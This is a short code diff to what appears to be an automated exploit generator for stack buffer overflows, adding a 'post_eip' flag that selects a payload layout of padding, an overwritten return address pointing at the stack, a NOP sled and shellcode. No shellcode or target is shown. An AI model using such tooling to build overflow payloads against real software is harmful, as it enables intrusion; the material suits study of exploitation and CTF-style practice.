@@ -757,6 +757,8 @@ def solve(
             # A 16-byte NOP sled absorbs the tiny GDB-env vs real-env stack delta.
             total = strat.offset + 4 + NOP_SLED + len(shellcode)
             res.addresses["esp_at_overflow"] = esp_at_crash
+            res.addresses["post_eip"] = 1          # tells generate.py which layout to use
+            strat.addresses["post_eip"] = 1
             res.payload_layout = (
                 f"[{strat.offset}x 'A'] [p32({hex(esp_at_crash)})] [{NOP_SLED}x NOP] [{len(shellcode)}x shellcode]"
                 f"  →  {total} bytes total"
